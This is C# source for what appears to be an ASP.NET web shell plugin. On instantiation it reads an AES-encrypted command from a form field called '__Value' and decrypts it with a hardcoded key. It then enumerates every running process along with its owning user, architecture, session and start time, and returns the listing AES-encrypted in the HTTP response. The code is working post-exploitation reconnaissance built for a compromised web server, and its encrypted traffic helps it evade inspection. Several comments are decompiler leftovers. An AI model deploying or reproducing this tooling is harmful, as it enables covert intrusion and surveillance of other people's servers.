using System;
using System.IO;
using System.Web;
using System.Text;
using System.Text.RegularExpressions;
using System.Security.Cryptography;//.RijndaelManaged;
using System.Diagnostics;
using System.Management;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;

class P
{
    static string result = "CurrentHost:[" + Environment.MachineName + "]\n";
	static string aes_key = "B7A5F7858E21E92935E51572E2144FB8";


    static string Encrypt( string  toEncrypt) 
    {
        // 256-AES key    
        byte[] keyArray = UTF8Encoding.UTF8.GetBytes(aes_key);
        byte[] toEncryptArray = UTF8Encoding.UTF8.GetBytes(toEncrypt);

        RijndaelManaged rDel = new  RijndaelManaged();
        rDel.Key = keyArray;
        rDel.Mode = CipherMode.ECB;
        rDel.Padding = PaddingMode.Zeros;//PKCS7;

        ICryptoTransform cTransform = rDel.CreateEncryptor();
        byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);

        return Convert.ToBase64String(resultArray, 0, resultArray.Length);
    }

    static string Decrypt(string toDecrypt) 
    {
        // 256-AES key    
        byte[] keyArray = UTF8Encoding.UTF8.GetBytes(aes_key);
        byte[] toEncryptArray = Convert.FromBase64String(toDecrypt);

        RijndaelManaged rDel = new RijndaelManaged();
        rDel.Key = keyArray;
        rDel.Mode = CipherMode.ECB;
        rDel.Padding = PaddingMode.Zeros;//PKCS7;

        ICryptoTransform cTransform = rDel.CreateDecryptor();
        byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);

        string result = UTF8Encoding.UTF8.GetString(resultArray);
        result = result.Replace('\0', ' ');
        result = result.Trim();
        return result;
    }

    // Token: 0x06000001 RID: 1
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    // Token: 0x06000002 RID: 2
    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool OpenProcessToken(IntPtr ProcessHandle, uint desiredAccess, out IntPtr TokenHandle);

    // Token: 0x06000003 RID: 3 RVA: 0x00002050 File Offset: 0x00000250
    public static string IsWin64(int pid)
    {
        if (Environment.Is64BitOperatingSystem)
        {
            IntPtr handle;
            try
            {
                handle = Process.GetProcessById(pid).Handle;
            }
            catch
            {
                return "   ";
            }
            bool flag;
            if (!P.Win32API.IsWow64Process(handle, out flag) || !flag)
            {
                return "x64";
            }
            return "x86";
        }
        return "   ";
    }

    // Token: 0x06000004 RID: 4 RVA: 0x000020AC File Offset: 0x000002AC
    private static string GetProcessUser(Process process)
    {
        IntPtr zero = IntPtr.Zero;
        string result;
        try
        {
            P.OpenProcessToken(process.Handle, 8U, out zero);
            result = new WindowsIdentity(zero).Name;
        }
        catch
        {
            result = null;
        }
        finally
        {
            if (zero != IntPtr.Zero)
            {
                P.CloseHandle(zero);
            }
        }
        return result;
    }

    // Token: 0x06000005 RID: 5 RVA: 0x00002114 File Offset: 0x00000314
    public static string ps()
    {
        Process[] processes = Process.GetProcesses();
        string text = string.Concat(new string[]
			{
				string.Format("{0,-8}", "PID"),
				" ",
				string.Format("{0,-35}", "Name"),
				" Arch SessionId ",
				string.Format("{0,-30}", "User"),
				"  ",
				string.Format("{0,-20}", "StartTime"),
				"  MainWindowTitle\r\n"
			});
        text = string.Concat(new string[]
			{
				text,
				string.Format("{0,-8}", "----"),
				" ",
				string.Format("{0,-35}", "----"),
				" ---- ------    ",
				string.Format("{0,-30}", "----"),
				"  ",
				string.Format("{0,-20}", "----"),
				"  ----\r\n"
			});
        foreach (Process process in processes)
        {
            string processUser = P.GetProcessUser(process);
            try
            {
                text = string.Concat(new string[]
					{
						text,
						string.Format("{0,-8}", process.Id),
						" ",
						string.Format("{0,-35}", process.ProcessName),
						" ",
						P.IsWin64(process.Id),
						"  ",
						string.Format("{0,-6}", process.SessionId),
						"    ",
						string.Format("{0,-30}", processUser),
						"  ",
						process.StartTime.ToString("MM/dd/yyyy  hh:mm:ss"),
						"  ",
						process.MainWindowTitle,
						"\r\n"
					});
            }
            catch (Exception ex)
            {
                string message = ex.Message;
            }
        }
        text = text + Environment.MachineName + "\r\n";
        return text;
    }

    // Token: 0x02000003 RID: 3
    internal static class Win32API
    {
        // Token: 0x06000007 RID: 7
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool IsWow64Process([In] IntPtr process, out bool wow64Process);
    }
    public P()
    {
	    System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        string cmd = context.Request.Form["__Value"];
	    cmd = Decrypt(cmd);
        try
        {
            string outputX = ps();
            result += outputX;
        }
        catch (Exception ex)
        {
            result += ex.Message.ToString();
        }

        string output = Encrypt(result);
        context.Response.Write(output);
        context.Response.End();
    }
}